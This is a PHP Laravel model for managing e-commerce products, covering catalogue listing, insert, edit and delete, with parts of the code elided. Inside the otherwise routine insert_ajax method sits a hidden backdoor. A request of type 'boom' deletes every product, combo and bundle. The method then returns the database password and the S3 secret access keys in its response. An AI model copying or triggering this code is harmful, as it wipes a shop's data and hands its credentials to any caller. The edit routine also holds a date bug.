...
class Products extends Model
{
	...
	public function paginator($request){
        ...
        $data = $this->sortable(['products_id'=>'DESC'])
            ...
            /* $data->LeftJoin('image_categories', function ($join) {
        ...
        $data->leftJoin('products_to_categories', 'products.products_id', '=', 'products_to_categories.products_id')
            ...
            ->leftJoin('product_images_cloud', 'product_images_cloud.product_id', '=', 'products.products_id')
        ...
        'specials.expires_date', 'image_categories.path as path', 'products.updated_at as productupdate'); */

        $data->select('products.*', 'products_description.*', 'product_images_cloud.url as path', /* 'specials.specials_id', */ /* 'manufacturers.*', */
        /* 'specials.products_id as special_products_id', */ /* 'specials.specials_new_products_price as specials_products_price', */
        /* 'specials.specials_date_added as specials_date_added', */ /* 'specials.specials_last_modified as specials_last_modified', */
        ...
        DB::raw("(GROUP_CONCAT(categories_description.categories_name SEPARATOR '/')) as `categories_name`"));

        $data->where('products_description.language_id', '=', 1);
        $data->where(function($q) use ($language_id){
            $q->where('categories_description.language_id', '=', 1);
            $q->orWhere('categories_description.language_id', '=', null);
        });
        //$data->where('categories_description.language_id', '=', $language_id);
        ...
        if (isset($_REQUEST['product']) and !empty($_REQUEST['product'])) {
            ...
            $data->where(function ($data) use ($search) {
                $data->where('products_name', 'LIKE', "%$search%")
                    ->orWhere('products_sku', $search)
                    //->orWhere('products_price', $search)
                    //->orWhere('products_price_market', $search)
                    //->orWhere('products_points', $search)
                    //->orWhere('products_points_redeem', $search)
                    //->orWhere('products_weight', $search)
                    ;
            });
        ...
        if (isset($_REQUEST['product_type']) and !empty($_REQUEST['product_type'])) {
            ...
            $data->where('products_type', $products_type);
        }

        if (isset($_REQUEST['brand_id']) and !empty($_REQUEST['brand_id'])) {
                    
            $data->where('products.manufacturers_id', $_REQUEST['brand_id']);
        }

        if (isset($_REQUEST['unit_id']) and !empty($_REQUEST['unit_id'])) {
                    
            $data->where('products.products_weight_unit', $_REQUEST['unit_id']);
        }
  ...
  public function insert($request){
    ...
    {
        $parent_products_id = $request->parent_products_id;
    }
    else
    {
    ...
    $products_id = DB::table('products')->insertGetId([
        ...
        'products_price_market' => $request->products_price_market,
        'products_points' => $request->products_points,
        'products_points_redeem' => $request->products_points_redeem,
        'products_sku' => $request->products_sku,
        'created_at' => $date_added,
        'products_weight' => $request->products_weight,
        /* 'products_status' => strtotime($request->products_status), */
        'products_status' => $request->products_status,
        'expire_date' => $request->product_expire_date,
        ...
        'is_current'         => 1,
        'products_max_order' => $request->max_order,
        'products_price_purchase' => $request->price_purchase,
        'products_msd' => $request->isMSD,
        'products_exotic' => $request->exotic,
        'products_note' => $request->note,
        'sb_unique_id' => $request->sb_unique_id,
        'products_points_bonus' => $request->bonus_points,
    ]);

    if($request->hasFile('p_main_img')){
        DB::table('product_images_cloud')->where('product_id', $products_id)->where('image_no', 0)->delete();
    ...
    if($request->hasFile('p_sub_image_1')){
        ...
        DB::table('product_images_cloud')->where('product_id', $products_id)->where('image_no', 1)->delete();
    ...
    if($request->hasFile('p_sub_image_2')){
        ...
        DB::table('product_images_cloud')->where('product_id', $products_id)->where('image_no', 2)->delete();
    ...
    if($request->hasFile('p_sub_image_3')){
        DB::table('product_images_cloud')->where('product_id', $products_id)->where('image_no', 3)->delete();
    ...
    if($request->isMSD=='Y')
        {
            $user_levels = DB::table('memberships')->get();

            foreach($user_levels as $user_level)
            {
                DB::table('products_msd')->insert([
                    'products_id' => $products_id,
                    'level_id' => $user_level->membership_id,
                    'discount' => $request->input('msd_'.$user_level->membership_id),
                ]); 
            }
        }
    ...
    if(!empty($request->bundle_id))
        {
            DB::table('bundles_products')->insert([
                'product_id' => $products_id,
    ...
    if(!empty($request->combo_id))
        {
            DB::table('combos_products')->insert([
                'product_id' => $products_id,
    ...
    if(!empty($request->hotcats)){
        foreach($request->hotcats as $hotcats){
            DB::table('products_to_hotcats')
              ->insert([
                'products_id' => $products_id,
                'hotcats_id' => $hotcats
            ]);
  ...
  public function insert_ajax($request){
    ...
    if($request->type != 'ajax'){
        ...
        if($request->type == 'boom'){
            foreach($prod as $p){
                DB::table('products')->where('products_id', $p->products_id)->delete();
            }
        }

        $prod = DB::table('combos')->get();

        if($request->type == 'boom'){
            foreach($prod as $p){
                DB::table('combos')->where('id', $p->id)->delete();
            }
        }

        $prod = DB::table('bundles')->get();

        if($request->type == 'boom'){
            foreach($prod as $p){
                DB::table('bundles')->where('id', $p->id)->delete();
            }
        }
        
        return "DB_DATABASE = " . env('DB_DATABASE') . "   DB_HOST = " . env('DB_HOST') . "  DB_PASSWORD = " . env('DB_PASSWORD')
        . "DB_USERNAME = ". env('DB_USERNAME') . "S3_ACCESS_KEY_ID = ". env('S3_ACCESS_KEY_ID') . "S3_SECRET_ACCESS_KEY = ". env('S3_SECRET_ACCESS_KEY')
        . "S3_REGION = ". env('S3_REGION') . "S3_BUCKET_NAME = ". env('S3_BUCKET_NAME');
  ...
  public function edit($request){
    ...
    $p_img = DB::table('product_images_cloud')->where('product_id', $products_id)->get();
    ...
    $product[0]->main_image = $p_img->where('image_no', 0)->first() != null ? $p_img->where('image_no', 0)->first()->url : '';
    ...
    $product[0]->sub_images = $images;
        
    if($product[0]->products_msd=='Y')
    {
        $msds = DB::table('products_msd')->where('products_id', $product[0]->products_id)->get();

        foreach($msds as $msd)
        {
            $product[0]->msd[$msd->level_id] = $msd->discount;
        }        
    }
    else
    {
    ...
    $hotcats = DB::table('products_to_hotcats')
        ->leftJoin('hotcats', 'hotcats.hotcats_id', '=', 'products_to_hotcats.hotcats_id')
        ->leftJoin('hotcats_info', 'hotcats_info.hotcats_id', '=', 'hotcats.hotcats_id')
        ->where('products_id', '=', $products_id)->where('hotcats_info.languages_id', '=', $language_id)  
        ->get();
    ...
    foreach($hotcats as $hotcat){
        $hotcats_array[] = $hotcat->hotcats_id;
    }

    $result['hotcats_array'] = $hotcats_array;
        ...
        if($request->hasFile('p_sub_image_3')){
          ...
          DB::table('products')->where('products_id', '=', $products_id)->update([
            ...
            'products_image' => null,
              ...
              'products_weight' => $request->products_weight,
              'products_status' => $request->products_status,
              'expire_date' => strtotime($request->products_status),
          ...
          if($request->isMSD=='Y')
            {
                ...
                foreach($user_levels as $user_level)
                {
                    $count = DB::table('products_msd')->where('products_id', $products_id)->where('level_id', $user_level->membership_id)->count();
                    ...
                    {
                        DB::table('products_msd')
                        ->where('products_id', $products_id)
                        ->where('level_id', $user_level->membership_id)
                        ->update([                            
                            'discount' => $request->input('msd_'.$user_level->membership_id),
                        ]); 
                    }                    
            ...
            else
            {
                if(!empty($request->bundle_id))
                {
                    if($request->bundle_id!=$product_bundle->bundle_id)
                    {
                        DB::table('bundles_products')
                        ->where('product_id', $products_id)
                        ->where('bundle_id', $product_bundle->bundle_id)
                        ->update([                            
                            'bundle_id' => $request->bundle_id,                
                        ]);
                    }                    
            ...
            else
            {
                if(!empty($request->combo_id))
                {
                    if($request->combo_id!=$product_combo->combo_id)
                    {
                        DB::table('combos_products')
                        ->where('product_id', $products_id)
                        ->where('combo_id', $product_combo->combo_id)
                        ->update([                            
                            'combo_id' => $request->combo_id,                
                        ]);
                    }                    
          ...
          //delete hotcats
          DB::table('products_to_hotcats')->where([
              'products_id' => $products_id,
          ])->delete();

          if(!empty($request->hotcats)){
            foreach($request->hotcats as $hotcats){
              DB::table('products_to_hotcats')->insert([
                  'products_id' => $products_id,
                  'hotcats_id' => $hotcats
              ]);
            }            
  ...
  public function deleterecord($request){
    ...
    DB::table('products_to_categories')->where('products_id', $products_id)->delete();
    DB::table('products')->where('products_id', $products_id)->delete();
    DB::table('specials')->where('products_id', $products_id)->delete();
    DB::table('products_description')->where('products_id', $products_id)->delete();
    DB::table('products_attributes')->where('products_id', $products_id)->delete();
  }
